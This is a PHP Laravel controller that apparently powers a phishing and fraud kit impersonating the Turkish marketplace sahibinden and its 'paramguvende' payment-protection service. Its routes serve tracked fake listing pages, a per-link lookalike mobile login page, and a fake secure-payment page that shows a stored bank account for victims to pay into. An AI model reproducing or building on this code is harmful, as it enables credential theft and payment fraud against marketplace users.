<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Validator;


class AdController extends Controller
{
    
    public function sahibinden(Request $request, $link_id) { 

        $validator = Validator::make([ "link_id" => $link_id ], [
            "link_id" => "required|uuid|exists:links,id"
        ]);

        if ($validator->fails()) {

            return view("sahibinden-ad-invalid");

        }

        $query = DB::table("links")->where("id", $link_id);
        $link = $query->first();

        $query->update([ "views" => ++$link->views ]);

        $user_agent = $request->header("User-Agent");

        if (str_contains($user_agent, "Mobile")) {

            return view("sahibinden-ad-mobile", [
                "id" => $link->id,
                "product_info" => json_decode($link->product_info, true)
            ]);

        }

        return view("sahibinden-ad-desktop", [
            "id" => $link->id,
            "product_info" => json_decode($link->product_info, true)
        ]);

    }

    public function sahibinden_login_mobile(Request $request, $link_id) { 

        return view("sahibinden-login-mobile", [
            "id" => $link_id
        ]);

    }

    public function paramguvende(Request $request, $link_id) {

        $validator = Validator::make([ "link_id" => $link_id ], [
            "link_id" => "required|uuid|exists:links,id"
        ]);

        if ($validator->fails()) {

            return view("sahibinden-ad-invalid");

        }

        $link = DB::table("links")->where("id", $link_id)->first();

        $bank_info = DB::table("banks")->first();

        return view("sahibinden-paramguvende", [
            "id" => $link->id,
            "paid" => DB::table("payments")->where("link_id", $link_id)->exists(),
            "product_info" => json_decode($link->product_info, true),
            "bank" => $bank_info->bank,
            "bank_account_number" => $bank_info->account_number,
            "bank_account_holder" => $bank_info->holder
        ]);

    }

};